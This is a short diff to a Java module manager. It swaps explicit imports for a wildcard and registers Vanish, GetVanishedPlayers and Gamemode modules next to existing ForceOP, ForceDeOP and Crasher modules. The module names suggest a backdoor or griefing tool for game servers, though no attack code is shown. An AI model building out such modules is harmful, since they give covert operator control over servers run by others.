@@ -1,9 +1,6 @@
 package me.sanyar.manager;
 
-import me.sanyar.modules.Crasher;
-import me.sanyar.modules.ForceDeOP;
-import me.sanyar.modules.ForceOP;
-import me.sanyar.modules.Get;
+import me.sanyar.modules.*;
 import me.sanyar.utils.VModule;
 
 import java.util.ArrayList;
@@ -21,5 +18,8 @@ public class ModuleManager {
         this.register(new ForceDeOP());
         this.register(new Crasher());
         this.register(new Get());
+        this.register(new Vanish());
+        this.register(new GetVanishedPlayers());
+        this.register(new Gamemode());
     }
 }
